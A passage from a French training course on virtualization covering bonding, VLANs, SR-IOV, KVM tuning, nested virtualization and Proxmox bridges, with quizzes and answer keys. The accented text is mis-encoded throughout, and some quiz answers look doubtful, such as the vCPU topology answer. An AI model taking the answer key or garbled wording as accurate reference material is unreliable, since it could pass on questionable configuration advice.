â”œâ”€â”€ Une interface active, autres en standby
â”œâ”€â”€ Basculement automatique en cas de panne
â””â”€â”€ Compatible avec tous les switches

Mode 4 (802.3ad) : LACP
â”œâ”€â”€ AgrÃ©gation dynamique nÃ©gociÃ©e
â”œâ”€â”€ Bande passante cumulÃ©e + redondance
â””â”€â”€ NÃ©cessite configuration switch

Mode 6 (balance-alb) : Adaptive Load Balancing
â”œâ”€â”€ Ã‰quilibrage adaptatif
â”œâ”€â”€ Pas de configuration switch requise
â””â”€â”€ Optimisation automatique des flux
```

**Configuration pratique du bonding :**

```bash
# CrÃ©ation d'un bond en mode LACP
cat > /etc/systemd/network/bond0.netdev << EOF
[NetDev]
Name=bond0
Kind=bond

[Bond]
Mode=802.3ad
TransmitHashPolicy=layer3+4
MIIMonitorSec=100
EOF

# Configuration des interfaces membres
cat > /etc/systemd/network/eth0.network << EOF
[Match]
Name=eth0

[Network]
Bond=bond0
EOF

# Activation
systemctl restart systemd-networkd
```

### VLAN et segmentation rÃ©seau

**VLAN (Virtual Local Area Network)** permet de segmenter logiquement un rÃ©seau physique en plusieurs rÃ©seaux isolÃ©s. Cette segmentation est cruciale pour la sÃ©curitÃ©, la performance et l'organisation des flux rÃ©seau dans un environnement virtualisÃ©.

**Types de VLAN :**
- **VLAN natif** : Trafic non-taggÃ© (gÃ©nÃ©ralement VLAN 1)
- **VLAN taggÃ©** : Trafic avec Ã©tiquette 802.1Q
- **VLAN de gestion** : DÃ©diÃ© Ã  l'administration
- **VLAN de stockage** : IsolÃ© pour le trafic SAN/NAS

```
Configuration VLAN sur Proxmox :

Interface physique (ens18)
â”œâ”€â”€ VLAN 10 (Management) : 192.168.10.0/24
â”œâ”€â”€ VLAN 20 (Production) : 192.168.20.0/24  
â”œâ”€â”€ VLAN 30 (Storage)    : 192.168.30.0/24
â””â”€â”€ VLAN 40 (DMZ)        : 192.168.40.0/24
```

**Configuration VLAN dans Proxmox :**

```bash
# CrÃ©ation d'interfaces VLAN
auto ens18.10
iface ens18.10 inet static
    address 192.168.10.10/24
    vlan-raw-device ens18

# Bridge avec VLAN awareness
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094
```

### Optimisation des performances rÃ©seau

**Jumbo Frames** augmentent la taille maximale des trames Ethernet de 1500 Ã  9000 octets, rÃ©duisant l'overhead de traitement pour les gros transferts de donnÃ©es.

```bash
# Configuration Jumbo Frames
ip link set dev ens18 mtu 9000

# VÃ©rification
ping -M do -s 8972 192.168.1.100  # 8972 + 28 (headers) = 9000
```

**SR-IOV (Single Root I/O Virtualization)** permet Ã  une interface rÃ©seau physique de prÃ©senter plusieurs fonctions virtuelles directement accessibles par les VM, contournant l'hyperviseur pour des performances maximales.

```bash
# VÃ©rification du support SR-IOV
lspci -v | grep -i sriov

# Activation des fonctions virtuelles
echo 4 > /sys/class/net/ens18/device/sriov_numvfs

# Attribution d'une VF Ã  une VM
qm set 100 -hostpci0 01:10.0
```

**DPDK (Data Plane Development Kit)** offre des performances rÃ©seau exceptionnelles en contournant le kernel Linux et en accÃ©dant directement au hardware rÃ©seau.

### Monitoring et diagnostic rÃ©seau

**Outils de diagnostic essentiels :**

```bash
# Statistiques dÃ©taillÃ©es par interface
ethtool -S ens18

# Monitoring en temps rÃ©el
iftop -i ens18

# Analyse des performances
iperf3 -s  # Serveur
iperf3 -c 192.168.1.100 -t 60  # Client

# Capture de paquets
tcpdump -i ens18 -w capture.pcap

# Analyse de la latence
mtr 192.168.1.100
```

**MÃ©triques rÃ©seau critiques :**
- **Bande passante** : DÃ©bit effectif vs thÃ©orique
- **Latence** : Temps de rÃ©ponse rÃ©seau
- **Jitter** : Variation de la latence
- **Perte de paquets** : Pourcentage de paquets perdus
- **Erreurs** : CRC, collisions, overruns

### SÃ©curitÃ© rÃ©seau physique

**Port Security** limite le nombre d'adresses MAC autorisÃ©es par port switch, prÃ©venant les attaques par flooding de table CAM.

**802.1X** authentifie les devices avant l'accÃ¨s rÃ©seau, essentiel dans un environnement avec de nombreuses interfaces virtuelles.

**VLAN Hopping** reprÃ©sente une vulnÃ©rabilitÃ© oÃ¹ un attaquant peut accÃ©der Ã  des VLAN non-autorisÃ©s. La prÃ©vention passe par :
- DÃ©sactivation du VLAN natif sur les ports trunk
- Configuration explicite des VLAN autorisÃ©s
- Isolation des VLAN sensibles

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure DevOps :** SÃ©parez les flux CI/CD sur des VLAN dÃ©diÃ©s avec QoS pour garantir les performances des builds critiques. Utilisez SR-IOV pour les nÅ“uds de test nÃ©cessitant des performances rÃ©seau natives.

**Laboratoire de cybersÃ©curitÃ© :** ImplÃ©mentez une segmentation stricte avec des VLAN isolÃ©s pour chaque scÃ©nario de test. Configurez des bridges internes pour simuler des rÃ©seaux d'entreprise complexes sans impact sur l'infrastructure de production.

**Production critique :** DÃ©ployez une architecture rÃ©seau redondante avec bonding LACP, sÃ©paration physique des flux de gestion et de donnÃ©es, et monitoring proactif avec alertes automatisÃ©es sur les mÃ©triques de performance et de sÃ©curitÃ©.

---


# Module 2 : Virtualisation

## 2.1 Concepts fondamentaux

### Qu'est-ce que la virtualisation ?

La virtualisation reprÃ©sente une rÃ©volution technologique qui permet d'abstraire les ressources physiques pour crÃ©er des environnements logiques indÃ©pendants. Imaginez la virtualisation comme un **chef d'orchestre magistral** qui dirige simultanÃ©ment plusieurs orchestres (machines virtuelles) avec un seul ensemble d'instruments (hardware physique). Chaque orchestre joue sa propre partition, ignorant l'existence des autres, tandis que le chef coordonne l'utilisation optimale de chaque instrument.

Cette abstraction rÃ©sout des problÃ¨mes fondamentaux de l'informatique moderne : sous-utilisation des serveurs, isolation des applications, flexibilitÃ© de dÃ©ploiement, et optimisation des coÃ»ts. Avant la virtualisation, un serveur physique exÃ©cutait gÃ©nÃ©ralement un seul systÃ¨me d'exploitation avec un taux d'utilisation moyen de 10-15%. Aujourd'hui, ce mÃªme serveur peut hÃ©berger 20-50 machines virtuelles avec un taux d'utilisation de 70-80%.

### Types de virtualisation

**Virtualisation complÃ¨te (Full Virtualization)** Ã©mule complÃ¨tement le hardware physique, permettant aux systÃ¨mes d'exploitation invitÃ©s de fonctionner sans modification. L'hyperviseur intercepte et traduit toutes les instructions privilÃ©giÃ©es.

**Paravirtualisation** nÃ©cessite des modifications du systÃ¨me d'exploitation invitÃ© pour qu'il communique directement avec l'hyperviseur via des hypercalls, Ã©liminant l'overhead de l'Ã©mulation.

**Virtualisation assistÃ©e par hardware** exploite les extensions CPU (Intel VT-x, AMD-V) pour accÃ©lÃ©rer la virtualisation en permettant l'exÃ©cution directe d'instructions privilÃ©giÃ©es dans un contexte contrÃ´lÃ©.

```
Ã‰volution des performances :

Ã‰mulation logicielle    : 100% overhead
â”œâ”€â”€ Traduction complÃ¨te des instructions
â””â”€â”€ Performance : 50% du natif

Paravirtualisation     : 10-20% overhead  
â”œâ”€â”€ Hypercalls optimisÃ©s
â””â”€â”€ Performance : 80-90% du natif

Hardware-assisted      : 2-5% overhead
â”œâ”€â”€ ExÃ©cution directe avec contrÃ´le
â””â”€â”€ Performance : 95-98% du natif
```

### Architecture de la virtualisation

L'architecture moderne de virtualisation s'organise en couches distinctes, chacune avec ses responsabilitÃ©s spÃ©cifiques :

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           Applications InvitÃ©es             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚        SystÃ¨me d'Exploitation InvitÃ©       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚              Hyperviseur                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚   Scheduler â”‚ â”‚    Memory Manager       â”‚â”‚
â”‚  â”‚     CPU     â”‚ â”‚                         â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚   Network   â”‚ â”‚    Storage Manager      â”‚â”‚
â”‚  â”‚   Manager   â”‚ â”‚                         â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚         Hardware Physique                   â”‚
â”‚  CPU    â”‚    RAM    â”‚   Storage  â”‚  Network â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ResponsabilitÃ©s de l'hyperviseur :**
- **Isolation** : Garantir que les VM ne peuvent pas interfÃ©rer entre elles
- **Allocation** : Distribuer les ressources physiques entre les VM
- **Ã‰mulation** : PrÃ©senter un hardware virtuel cohÃ©rent
- **SÃ©curitÃ©** : ContrÃ´ler l'accÃ¨s aux ressources privilÃ©giÃ©es

### Conteneurs vs Machines Virtuelles

La distinction entre conteneurs et machines virtuelles reprÃ©sente un choix architectural fondamental avec des implications profondes sur les performances, la sÃ©curitÃ© et la gestion.

```
Architecture VM :
App A    App B    App C
â”œâ”€â”€â”€â”€â”¤   â”œâ”€â”€â”€â”€â”¤   â”œâ”€â”€â”€â”€â”¤
OS A     OS B     OS C
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
     Hyperviseur
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
      OS HÃ´te
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
      Hardware

Architecture Conteneurs :
App A    App B    App C
â”œâ”€â”€â”€â”€â”¤   â”œâ”€â”€â”€â”€â”¤   â”œâ”€â”€â”€â”€â”¤
   Runtime Conteneurs
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
      OS HÃ´te
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
      Hardware
```

**Avantages des VM :**
- Isolation complÃ¨te au niveau kernel
- Support de diffÃ©rents OS
- SÃ©curitÃ© renforcÃ©e
- CompatibilitÃ© legacy

**Avantages des conteneurs :**
- DÃ©marrage quasi-instantanÃ© (< 1 seconde)
- Overhead minimal (2-5%)
- DensitÃ© Ã©levÃ©e (100+ conteneurs par serveur)
- PortabilitÃ© applicative

### Hyperviseurs : Classification et caractÃ©ristiques

**Hyperviseurs Type 1 (Bare Metal)** s'exÃ©cutent directement sur le hardware physique, offrant des performances optimales et une sÃ©curitÃ© renforcÃ©e.

**Exemples Type 1 :**
- **VMware vSphere/ESXi** : Leader du marchÃ© entreprise
- **Microsoft Hyper-V** : IntÃ©gration Windows native
- **Proxmox VE** : Solution open-source complÃ¨te
- **Citrix XenServer** : Performance et scalabilitÃ©
- **KVM** : IntÃ©grÃ© au kernel Linux

**Hyperviseurs Type 2 (Hosted)** s'exÃ©cutent comme application sur un OS existant, plus simples Ã  dÃ©ployer mais avec des performances rÃ©duites.

**Exemples Type 2 :**
- **VMware Workstation/Fusion** : DÃ©veloppement et test
- **VirtualBox** : Solution gratuite polyvalente
- **Parallels Desktop** : OptimisÃ© pour macOS

### KVM : Architecture et optimisations

**KVM (Kernel-based Virtual Machine)** transforme le kernel Linux en hyperviseur Type 1, combinant la stabilitÃ© du kernel avec des performances natives.

```
Architecture KVM :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                VM Guest                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚     vCPU    â”‚ â”‚       Guest RAM         â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                QEMU                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚   Device    â”‚ â”‚      I/O Emulation      â”‚â”‚
â”‚  â”‚  Emulation  â”‚ â”‚                         â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚              KVM Module                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚   Memory    â”‚ â”‚     CPU Extensions      â”‚â”‚
â”‚  â”‚ Management  â”‚ â”‚     (VT-x/AMD-V)        â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚             Linux Kernel                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Optimisations KVM avancÃ©es :**

```bash
# VÃ©rification du support hardware
egrep -c '(vmx|svm)' /proc/cpuinfo
lsmod | grep kvm

# Configuration CPU optimale
qm set 100 -cpu host,flags=+aes
qm set 100 -numa 1

# Optimisation mÃ©moire
qm set 100 -balloon 0  # DÃ©sactiver ballooning pour performance
qm set 100 -hugepages 2  # Utiliser hugepages

# Optimisation rÃ©seau avec virtio
qm set 100 -net0 virtio,bridge=vmbr0,firewall=0

# Optimisation stockage
qm set 100 -scsi0 local-lvm:vm-100-disk-0,cache=none,discard=on,iothread=1
```

### Nested Virtualization : Avantages et dÃ©fis

La **virtualisation imbriquÃ©e** permet d'exÃ©cuter un hyperviseur Ã  l'intÃ©rieur d'une machine virtuelle, crÃ©ant des VM de second niveau. Cette technique ouvre des possibilitÃ©s extraordinaires pour les laboratoires, le dÃ©veloppement et la formation.

**Cas d'usage de la nested virtualization :**
- **Laboratoires de formation** : Enseigner la virtualisation sans hardware dÃ©diÃ©
- **DÃ©veloppement cloud** : Tester des solutions multi-tenant
- **Recherche en sÃ©curitÃ©** : Analyser des malwares dans des environnements isolÃ©s
- **CI/CD avancÃ©** : Tests d'infrastructure as code

```
Architecture Nested :

Hardware Physique
â”œâ”€â”€ Hyperviseur L0 (Proxmox)
    â”œâ”€â”€ VM1 (Hyperviseur L1 - VMware)
    â”‚   â”œâ”€â”€ VM1.1 (Windows Server)
    â”‚   â””â”€â”€ VM1.2 (Ubuntu Desktop)
    â””â”€â”€ VM2 (Hyperviseur L1 - Hyper-V)
        â”œâ”€â”€ VM2.1 (Windows 10)
        â””â”€â”€ VM2.2 (CentOS)
```

**Configuration nested virtualization :**

```bash
# Activation sur l'hÃ´te Proxmox
echo "options kvm-intel nested=1" >> /etc/modprobe.d/kvm-intel.conf
echo "options kvm-amd nested=1" >> /etc/modprobe.d/kvm-amd.conf

# RedÃ©marrage des modules
modprobe -r kvm-intel
modprobe kvm-intel

# Configuration VM pour nested
qm set 100 -cpu host,flags=+vmx  # Intel
qm set 100 -cpu host,flags=+svm  # AMD

# VÃ©rification dans la VM
egrep -c '(vmx|svm)' /proc/cpuinfo
```

**Limitations et considÃ©rations :**
- **Performance** : PÃ©nalitÃ© de 20-40% par niveau
- **ComplexitÃ©** : Debugging difficile en cas de problÃ¨me
- **Support** : LimitÃ© selon les hyperviseurs
- **SÃ©curitÃ©** : Surface d'attaque Ã©largie

### Optimisation des performances

**CPU Pinning** associe des vCPU spÃ©cifiques Ã  des cores physiques, Ã©liminant la migration et amÃ©liorant la prÃ©visibilitÃ© des performances.

```bash
# Pinning CPU pour VM critique
qm set 100 -vcpus 4
qm set 100 -affinity 0,1,2,3

# VÃ©rification
taskset -cp $(pgrep -f "kvm.*100")
```

**NUMA Awareness** optimise l'allocation mÃ©moire en respectant la topologie NUMA du serveur physique.

```bash
# Configuration NUMA optimale
qm set 100 -numa 1
qm set 100 -memory 16384
qm set 100 -sockets 1 -cores 8

# Monitoring NUMA
numastat -p $(pgrep -f "kvm.*100")
```

### SÃ©curitÃ© de la virtualisation

**VM Escape** reprÃ©sente la vulnÃ©rabilitÃ© la plus critique : un attaquant dans une VM parvient Ã  s'Ã©chapper vers l'hyperviseur ou d'autres VM.

**Mesures de protection :**
- **Isolation rÃ©seau** : VLAN dÃ©diÃ©s, firewalls VM
- **ContrÃ´le d'accÃ¨s** : RBAC strict, authentification forte
- **Monitoring** : Surveillance des ressources et comportements
- **Hardening** : Configuration sÃ©curisÃ©e de l'hyperviseur

```bash
# Configuration firewall VM
qm set 100 -net0 virtio,bridge=vmbr0,firewall=1

# Limitation des ressources
qm set 100 -cpulimit 2  # Limite Ã  2 cores
qm set 100 -memory 4096,balloon=2048  # MÃ©moire dynamique
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure DevOps :** Utilisez la nested virtualization pour crÃ©er des environnements de test complets incluant l'infrastructure de virtualisation elle-mÃªme. Configurez des pipelines CI/CD qui dÃ©ploient et testent automatiquement des configurations d'hyperviseur.

**Laboratoire Red Team :** Exploitez la nested virtualization pour crÃ©er des environnements d'attaque rÃ©alistes avec plusieurs niveaux de dÃ©fense. Isolez complÃ¨tement les activitÃ©s de test dans des VM imbriquÃ©es pour Ã©viter tout impact sur l'infrastructure de production.

**Formation et certification :** DÃ©ployez des laboratoires complets de virtualisation dans des VM, permettant aux Ã©tudiants d'expÃ©rimenter avec diffÃ©rents hyperviseurs sans nÃ©cessiter de hardware dÃ©diÃ© pour chaque participant.

---

## Quiz Module 1 : Bases Hardware

**Question 1 :** Dans une architecture NUMA Ã  2 sockets avec 8 cores chacun, quelle est la configuration optimale pour une VM nÃ©cessitant 8 vCPU ?
a) 2 sockets Ã— 4 cores Ã— 1 thread
b) 1 socket Ã— 4 cores Ã— 2 threads  
c) 8 sockets Ã— 1 core Ã— 1 thread
d) 4 sockets Ã— 2 cores Ã— 1 thread

**Question 2 :** Quel mode de cache est recommandÃ© pour une base de donnÃ©es critique sur stockage local ?
a) writeback
b) writethrough
c) none
d) directsync

**Question 3 :** Le ballooning mÃ©moire permet de :
a) Augmenter la RAM physique du serveur
b) RÃ©cupÃ©rer dynamiquement la mÃ©moire inutilisÃ©e des VM
c) AccÃ©lÃ©rer les accÃ¨s mÃ©moire
d) Partager la mÃ©moire entre VM

**Question 4 :** En bonding rÃ©seau, le mode LACP (802.3ad) offre :
a) Seulement de la redondance
b) Seulement de l'agrÃ©gation de bande passante
c) Redondance + agrÃ©gation avec nÃ©gociation automatique
d) Ã‰quilibrage de charge sans configuration switch

**Question 5 :** Les hugepages amÃ©liorent les performances en :
a) Augmentant la frÃ©quence CPU
b) RÃ©duisant la pression sur le TLB
c) AccÃ©lÃ©rant les accÃ¨s rÃ©seau
d) Optimisant le cache L3

**RÃ©ponses :** 1-b, 2-b, 3-b, 4-c, 5-b

---

## Quiz Module 2 : Virtualisation

**Question 1 :** La virtualisation assistÃ©e par hardware (VT-x/AMD-V) rÃ©duit l'overhead Ã  :
a) 50%
b) 20%
c) 10%
d) 2-5%

**Question 2 :** Dans KVM, QEMU est responsable de :
a) La gestion mÃ©moire
b) L'Ã©mulation des devices
c) Le scheduling CPU
d) La sÃ©curitÃ©

**Question 3 :** La nested virtualization est particuliÃ¨rement utile pour :
a) AmÃ©liorer les performances
b) RÃ©duire la consommation
c) Les laboratoires de formation
d) Simplifier la gestion

**Question 4 :** Le CPU pinning permet de :
a) Augmenter la frÃ©quence CPU
b) Associer des vCPU Ã  des cores spÃ©cifiques
c) Partager des cores entre VM
d) RÃ©duire la consommation

**Question 5 :** Un hyperviseur Type 1 se caractÃ©rise par :
a) L'exÃ©cution sur un OS existant
b) L'exÃ©cution directe sur le hardware
c) L'utilisation de conteneurs
d) La paravirtualisation obligatoire

**RÃ©ponses :** 1-d, 2-b, 3-c, 4-b, 5-b

---

## Bonnes Pratiques Modules 1-2

### Hardware et Dimensionnement
- [ ] Respecter la rÃ¨gle 80/20 pour l'utilisation des ressources
- [ ] Configurer la topologie CPU cohÃ©rente avec NUMA
- [ ] RÃ©server 15-20% de RAM pour l'hyperviseur
- [ ] Utiliser des hugepages pour les charges critiques
- [ ] Monitorer les mÃ©triques IOPS et latence stockage

### RÃ©seau et ConnectivitÃ©  
- [ ] ImplÃ©menter le bonding pour la redondance
- [ ] SÃ©parer les flux avec des VLAN dÃ©diÃ©s
- [ ] Configurer des Jumbo Frames pour le stockage
- [ ] Utiliser SR-IOV pour les performances critiques
- [ ] Surveiller la bande passante et les erreurs

### Virtualisation et Performance
- [ ] Activer les extensions hardware (VT-x/AMD-V)
- [ ] Configurer l'affinitÃ© CPU pour les charges critiques
- [ ] Optimiser les drivers virtio pour I/O
- [ ] Limiter l'overcommit selon le type de charge
- [ ] Tester la nested virtualization avant production

### SÃ©curitÃ© et Isolation
- [ ] Activer les firewalls VM par dÃ©faut
- [ ] Segmenter les rÃ©seaux par fonction
- [ ] Limiter les ressources par VM
- [ ] Auditer rÃ©guliÃ¨rement les configurations
- [ ] Maintenir l'hyperviseur Ã  jour

---


# Module 3 : RÃ©seau Virtuel

## 3.1 Bridges et commutateurs virtuels

### Comprendre les bridges rÃ©seau

Un **bridge rÃ©seau** (pont rÃ©seau) fonctionne comme une **multiprise intelligente** qui connecte plusieurs appareils tout en apprenant et mÃ©morisant leurs adresses. Contrairement Ã  un hub qui diffuse aveuglÃ©ment tous les paquets, un bridge maintient une table d'adresses MAC et ne transmet les paquets qu'aux ports concernÃ©s, rÃ©duisant ainsi les collisions et optimisant les performances.

Dans un environnement virtualisÃ©, les bridges deviennent encore plus critiques car ils permettent aux machines virtuelles de communiquer entre elles et avec le rÃ©seau physique. Chaque interface rÃ©seau virtuelle (vNIC) d'une VM se connecte Ã  un bridge, qui fait le lien avec l'interface physique du serveur.

### Architecture d'un bridge Proxmox

```
SchÃ©ma Bridge vmbr0 dans Proxmox :

                    RÃ©seau Physique
                         â”‚
                    â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
                    â”‚  ens18  â”‚ Interface physique
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
                    â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
                    â”‚  vmbr0  â”‚ Bridge principal
                    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                         â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                â”‚                â”‚
   â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”      â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”
   â”‚ VM 101  â”‚      â”‚ VM 102  â”‚      â”‚ VM 103  â”‚
   â”‚ veth0   â”‚      â”‚ veth0   â”‚      â”‚ veth0   â”‚
   â”‚192.168.1â”‚      â”‚192.168.1â”‚      â”‚192.168.1â”‚
   â”‚   .10   â”‚      â”‚   .11   â”‚      â”‚   .12   â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Table MAC du bridge vmbr0 :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Adresse MAC    â”‚  Port   â”‚   Age    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 52:54:00:12:34:56â”‚ VM 101  â”‚ 30 sec   â”‚
â”‚ 52:54:00:12:34:57â”‚ VM 102  â”‚ 45 sec   â”‚
â”‚ 52:54:00:12:34:58â”‚ VM 103  â”‚ 12 sec   â”‚
â”‚ aa:bb:cc:dd:ee:ffâ”‚ ens18   â”‚ 120 sec  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Configuration avancÃ©e des bridges

**Bridge simple** : Configuration de base pour connecter les VM au rÃ©seau physique.

```bash
# Configuration dans /etc/network/interfaces
auto vmbr0
iface vmbr0 inet static
    address 192.168.1.100/24
    gateway 192.168.1.1
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-maxwait 0
```

**Bridge VLAN-aware** : Permet de gÃ©rer plusieurs VLAN sur un seul bridge.

```bash
auto vmbr0
iface vmbr0 inet manual
    bridge-ports ens18
    bridge-stp off
    bridge-fd 0
    bridge-vlan-aware yes
    bridge-vids 2-4094
```

**Bridge interne** : Pour la communication inter-VM sans accÃ¨s externe.

```bash
auto vmbr1
iface vmbr1 inet static
    address 10.0.0.1/24
    bridge-ports none
    bridge-stp off
    bridge-fd 0
```

### Open vSwitch vs Linux Bridge

**Linux Bridge** reprÃ©sente la solution native du kernel Linux, simple et performante pour la plupart des cas d'usage. Il offre des fonctionnalitÃ©s de base robustes avec un overhead minimal.

